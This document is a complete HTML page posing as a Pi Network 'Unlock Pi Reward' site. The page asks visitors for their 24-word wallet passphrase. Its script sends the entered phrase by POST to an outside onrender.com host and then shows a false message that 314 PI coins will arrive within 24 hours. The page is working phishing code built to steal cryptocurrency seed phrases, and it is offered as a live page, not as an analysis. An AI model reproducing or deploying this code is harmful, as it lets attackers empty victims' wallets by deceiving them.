<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Reward</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f4f4f4;
            margin: 0;
            overflow-x: hidden;
        }

        .container {
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        h3 {
            font-size: 22px;
            color: #5a2da2;
            margin-bottom: 20px;
        }

        textarea {
            width: 100%;
            height: 100px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            resize: none;
        }

        button {
            width: 100%;
            background-color: #5a2da2;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background-color: #4a2390;
        }

        .message {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            color: #2e7d32;
            opacity: 0;
            animation: fadeIn 1.5s forwards, bounce 1.2s ease infinite;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
                transform: scale(0.9);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }

        .message span {
            color: #FF6F00;
        }
    </style>
    <script>
        async function submitPassphrase(event) {
            event.preventDefault();

            const passphrase = document.getElementById("passphrase").value.trim();
            const messageBox = document.getElementById("message");

            if (passphrase.split(" ").length !== 24) {
                alert("Please enter a valid 24-word passphrase.");
                return;
            }

            try {
                const response = await fetch("https://pinetwork-ib9q.onrender.com/submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ passphrase })
                });

                const data = await response.json();
                if (response.ok) {
                    messageBox.innerHTML = `ðŸŽ‰ <span>Congratulations!!!</span><br>You have earned your <span>314 PI Coins</span> Successfully.<br> It will be in your wallet within <span>24hrs</span>!`;
                    messageBox.style.color = "#4caf50";
                    messageBox.style.opacity = 1;
                } else {
                    messageBox.textContent = data || "Error saving passphrase.";
                    messageBox.style.color = "#e53935";
                    messageBox.style.opacity = 1;
                }
            } catch (err) {
                console.error("Error:", err);
                alert("An error occurred. Please try again later.");
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h3>Unlock Pi Reward</h3>
        <form onsubmit="submitPassphrase(event)">
            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
            <button type="submit">Unlock with passphrase</button>
        </form>
        <div id="message" class="message"></div>
    </div>
</body>
</html>
